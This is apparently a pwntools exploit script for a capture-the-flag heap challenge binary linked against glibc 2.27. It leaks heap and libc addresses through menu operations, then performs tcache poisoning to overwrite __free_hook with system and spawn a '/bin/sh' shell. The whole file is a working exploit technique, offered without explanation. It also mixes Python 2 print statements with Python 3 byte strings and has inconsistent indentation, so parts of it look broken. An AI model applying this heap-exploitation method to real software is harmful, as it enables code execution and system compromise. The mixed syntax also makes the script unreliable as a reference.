from pwn import *
from pwn import p64,u64,p32,u32,p8

context.arch = 'amd64'
context.log_level = 'debug'
libc=ELF('./libc-2.27.so')
#context.terminal = ['tmux','sp','-h']

# elf = ELF('./chall')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# libc = ELF('')

io=process('./chall',env={'LD_PRELOAD':'./libc-2.27.so'})

def create(size,content):
    io.sendlineafter('>>', b'passwd:Cr4at3 \nopcode:1\n')
    io.sendlineafter('>>>',str(size))
    io.sendlineafter('>>>',content)

def delete(idx):
    io.sendlineafter('>>', b'passwd:D3l4te \nopcode:4\n')
    io.sendlineafter('>>>',str(idx))

def edit(idx,content):
    io.sendlineafter('>>', b'passwd:Ed1t \nopcode:3\n')
    io.sendlineafter('>>>',str(idx))
    io.sendafter('>>>',content)

def show(idx):
    io.sendlineafter('>>', b'passwd:SH0w \nopcode:2\n')
    io.sendlineafter('>>>',str(idx))

def recv(junk):
#	 io.recvuntil(junk)
# 	 leak = u64(io.recv(6).ljust(8,b'00))
     leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
     info('leak:',hex(leak))
     return leak

for i in range(10):
 create(0x208,b'a'*0x8)
edit(0,'b'*0x208)
show(0)
io.recvuntil('b'*0x208)
heap_addr = u64(io.recv(6).ljust(8,'\x00'))
print "heap_addr:",hex(heap_addr)

for i in range(9):
 delete(0)
for i in range(7):
 create(0x208,b'a'*0x8)
for i in range(1):
 create(0x208,b'a'*0x8)
show(0)
io.recvuntil('a'*0x8)
leak_addr = u64(io.recv(6).ljust(8,'\x00'))
print "leak_addr:",hex(leak_addr)
libcbase=leak_addr-(0x7ffff7dcde0a-0x00007ffff79e2000)


create(0x208,b'a'*0x8)
create(0x208,b'a'*0x8)
create(0x208,b'a'*0x8)
create(0x208,b'a'*0x8)
create(0x208,b'a'*0x8)
create(0x208,b'a'*0x8)
create(0x208,b'a'*0x8)
delete(4)
delete(3)
delete(0)
free=libcbase+libc.sym['__free_hook']
system=libcbase+libc.sym['system']
edit(0,'a'*0x200+p64(0x400))
edit(0,'a'*0x218+p64(0x220)+p64(free))
create(0x208,'/bin/sh\x00')
create(0x208,p64(system))
gdb.attach(io, 'b *0x0000555555554d9a')
pause()
delete(1)

io.interactive()

